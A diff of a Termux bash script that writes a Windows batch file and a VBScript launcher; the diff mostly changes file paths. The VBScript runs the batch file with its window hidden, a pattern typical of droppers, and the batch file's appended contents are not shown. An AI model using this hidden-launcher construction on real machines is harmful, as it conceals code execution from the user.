@@ -1,4 +1,4 @@
-#! /bin/bash/
+#!/data/data/com.termux/files/usr/bin/bash
 
 #ipp="$(curl ifconfig.co)"  > /dev/null 2>&1
 
@@ -181,19 +181,19 @@ final() {
 
 #########################
 
-touch x0.bat
-echo "@echo off" >> x0.bat
- echo "echo." >> x0.bat
- echo "echo." >> x0.bat
- echo "timeout  $ttiemp"  >> x0.bat
-  echo "echo." >>x0.bat
-   echo "echo." >> x0.bat
-cat /data/data/com.termux/files/home/99/0/x01  >> x0.bat
+touch /data/data/com.termux/files/home/99/0/x1/x0.bat
+echo "@echo off" >> /data/data/com.termux/files/home/99/0/x1/x0.bat
+ echo "echo." >> /data/data/com.termux/files/home/99/0/x1/x0.bat
+ echo "echo." >> /data/data/com.termux/files/home/99/0/x1/x0.bat
+ echo "timeout  $ttiemp"  >> /data/data/com.termux/files/home/99/0/x1/x0.bat
+  echo "echo." >>/data/data/com.termux/files/home/99/0/x1/x0.bat
+   echo "echo." >> /data/data/com.termux/files/home/99/0/x1/x0.bat
+cat /data/data/com.termux/files/home/99/0/x01  >> /data/data/com.termux/files/home/99/0/x1/x0.bat
 rm -f /data/data/com.termux/files/home/99/0/x01 > /dev/null 2>&1
 
 touch /data/data/com.termux/files/home/$p00r
 bata="/data/data/com.termux/files/home/99/0/x1/x0.bat"
-#clear 
+#clear
   
 
 
@@ -212,11 +212,11 @@ bata="/data/data/com.termux/files/home/99/0/x1/x0.bat"
                                             fi
 
 echo "..............................................."
-touch $vbsx.vbs
+touch /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
 
-echo 'Set WshShell = CreateObject("WScript.Shell")' >> $vbsx.vbs
-echo 'WshShell.Run chr(34) & "x0.bat" & Chr(34), 0' >> $vbsx.vbs
-echo "Set WshShell = Nothing" >> $vbsx.vbs
+echo 'Set WshShell = CreateObject("WScript.Shell")' >> /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
+echo 'WshShell.Run chr(34) & "x0.bat" & Chr(34), 0' >> /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
+echo "Set WshShell = Nothing" >> /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
 batta="/data/data/com.termux/files/home/99/0/x1/$vbsx.vbs"
 #clear 
   
